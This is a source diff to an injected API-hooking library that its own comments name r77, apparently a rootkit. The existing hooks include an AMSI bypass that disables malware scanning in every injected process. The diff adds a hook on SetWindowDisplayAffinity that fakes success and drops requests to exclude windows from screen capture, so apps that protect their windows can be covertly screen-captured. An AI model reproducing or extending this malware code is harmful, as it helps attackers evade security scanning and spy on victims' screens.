@@ -27,6 +27,7 @@ static NT_NTDEVICEIOCONTROLFILE OriginalNtDeviceIoControlFile;
 static NT_PDHGETRAWCOUNTERARRAYW OriginalPdhGetRawCounterArrayW;
 static NT_PDHGETFORMATTEDCOUNTERARRAYW OriginalPdhGetFormattedCounterArrayW;
 static NT_AMSISCANBUFFER OriginalAmsiScanBuffer;
+static NT_SETWINDOWDISPLAYAFFINITY OriginalSetWindowDisplayAffinity;
 
 static DWORD TlsNtEnumerateKeyCacheKey;
 static DWORD TlsNtEnumerateKeyCacheIndex;
@@ -59,6 +60,7 @@ VOID InitializeHooks()
 	InstallHook("pdh.dll", "PdhGetRawCounterArrayW", (LPVOID*)&OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	InstallHook("pdh.dll", "PdhGetFormattedCounterArrayW", (LPVOID*)&OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	InstallHook("amsi.dll", "AmsiScanBuffer", (LPVOID*)&OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
+	InstallHook("user32.dll", "SetWindowDisplayAffinity", (LPVOID*)&OriginalSetWindowDisplayAffinity, HookedSetWindowDisplayAffinity);
 	DetourTransactionCommit();
 
 	// Usually, ntdll.dll should be the only DLL to hook.
@@ -97,6 +99,7 @@ VOID UninitializeHooks()
 	UninstallHook(OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	UninstallHook(OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	UninstallHook(OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
+	UninstallHook(OriginalSetWindowDisplayAffinity, HookedSetWindowDisplayAffinity);
 	DetourTransactionCommit();
 
 	TlsFree(TlsNtEnumerateKeyCacheKey);
@@ -850,6 +853,21 @@ static HRESULT WINAPI HookedAmsiScanBuffer(LPVOID amsiContext, LPVOID buffer, UL
 	// Bypass AMSI in every process that is injected with r77.
 
 	return 0x80070057;
+}
+static BOOL WINAPI HookedSetWindowDisplayAffinity(HWND hWnd, DWORD dwAffinity)
+{
+	// Block SetWindowDisplayAffinity calls that attempt to exclude the window from capture.
+	// WDA_EXCLUDEFROMCAPTURE (0x11) and WDA_MONITOR (0x01) prevent screen capture.
+	// By blocking these calls, the window becomes capturable.
+
+	if (dwAffinity == 0x11 || dwAffinity == 0x01)
+	{
+		// Return TRUE to simulate success, but don't actually set the affinity.
+		return TRUE;
+	}
+
+	// For other values (e.g., WDA_NONE = 0x00), call the original function.
+	return OriginalSetWindowDisplayAffinity(hWnd, dwAffinity);
 }
 
 static DWORD WINAPI WriteChildProcessPipeThread(LPVOID parameter)
